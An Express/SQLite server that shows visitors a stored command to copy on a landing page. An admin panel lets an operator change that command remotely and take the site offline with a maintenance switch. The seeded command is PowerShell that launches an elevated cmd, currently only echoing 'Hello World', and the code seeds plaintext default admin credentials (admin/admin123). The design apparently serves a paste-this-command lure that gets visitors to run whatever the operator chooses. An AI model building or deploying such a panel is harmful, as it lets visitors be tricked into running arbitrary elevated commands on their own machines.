const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const { randomBytes } = require('crypto');

const app = express();
const PORT = process.env.PORT || 3001;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

app.use(session({
  secret: randomBytes(32).toString('hex'),
  resave: false,
  saveUninitialized: true,
  cookie: { maxAge: 24 * 60 * 60 * 1000 }
}));

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

const db = new sqlite3.Database(path.join(__dirname, 'data.db'), (err) => {
  if (err) console.error('Database error:', err);
  else console.log('Connected to SQLite database');
});

db.serialize(() => {
  db.run(`
    CREATE TABLE IF NOT EXISTS admin_users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE,
      password TEXT,
      role TEXT DEFAULT 'admin'
    )
  `);

  db.run(`
    INSERT OR IGNORE INTO admin_users (username, password, role)
    VALUES ('admin', 'admin123', 'admin')
  `);

  db.run(`
    CREATE TABLE IF NOT EXISTS settings (
      key TEXT PRIMARY KEY,
      value TEXT
    )
  `);

  db.run(`
    INSERT OR IGNORE INTO settings (key, value)
    VALUES ('copy_text', 'powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList ''/k echo Hello World''"'), ('site_enabled', 'true')
  `);
});

function isSiteEnabled(callback) {
  db.get("SELECT value FROM settings WHERE key='site_enabled'", (err, row) => {
    if (err || !row) return callback(true);
    callback(row.value === 'true');
  });
}

app.get('/', (req, res) => {
  isSiteEnabled((enabled) => {
    if (!enabled) {
      return res.status(503).send('<html><body style="background:#0A0A0A;color:#E5E5E5;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;"><div style="text-align:center;"><h1>Site Temporarily Unavailable</h1><p>This site is currently undergoing maintenance. Please check back later.</p></div></body></html>');
    }

    db.get("SELECT value FROM settings WHERE key='copy_text'", (err, row) => {
      const copyText = (err || !row) ? '' : row.value;
      res.render('landing', { copyText });
    });
  });
});

app.get('/admin/login', (req, res) => {
  if (req.session.adminLoggedIn) return res.redirect('/admin/dashboard');
  res.render('admin/login');
});

app.post('/admin/login', (req, res) => {
  const { username, password } = req.body;

  db.get(
    'SELECT * FROM admin_users WHERE username = ? AND password = ?',
    [username, password],
    (err, user) => {
      if (err || !user) {
        return res.json({ success: false, message: 'Invalid credentials' });
      }
      req.session.adminLoggedIn = true;
      req.session.adminUsername = user.username;
      res.json({ success: true, redirect: '/admin/dashboard' });
    }
  );
});

app.get('/admin/dashboard', (req, res) => {
  if (!req.session.adminLoggedIn) return res.redirect('/admin/login');

  db.get("SELECT value FROM settings WHERE key='copy_text'", (err, row) => {
    const copyText = (err || !row) ? '' : row.value;
    res.render('admin/dashboard', { copyText });
  });
});

app.get('/admin/api/settings', (req, res) => {
  if (!req.session.adminLoggedIn) {
    return res.json({ error: 'Unauthorized' });
  }

  db.all('SELECT * FROM settings', [], (err, settings) => {
    if (err) return res.json({ error: 'Database error' });

    const settingsObj = {};
    settings.forEach(s => {
      settingsObj[s.key] = s.value;
    });
    res.json(settingsObj);
  });
});

app.post('/admin/api/settings', (req, res) => {
  if (!req.session.adminLoggedIn) {
    return res.json({ success: false, message: 'Unauthorized' });
  }

  const { copy_text, site_enabled } = req.body;

  db.run(
    "INSERT OR REPLACE INTO settings (key, value) VALUES ('copy_text', ?)",
    [copy_text || ''],
    (err) => {
      if (err) return res.json({ success: false, message: 'Database error' });

      db.run(
        "INSERT OR REPLACE INTO settings (key, value) VALUES ('site_enabled', ?)",
        [site_enabled ? 'true' : 'false'],
        (err) => {
          if (err) return res.json({ success: false, message: 'Database error' });
          res.json({ success: true });
        }
      );
    }
  );
});

app.post('/admin/logout', (req, res) => {
  req.session.destroy();
  res.json({ success: true });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
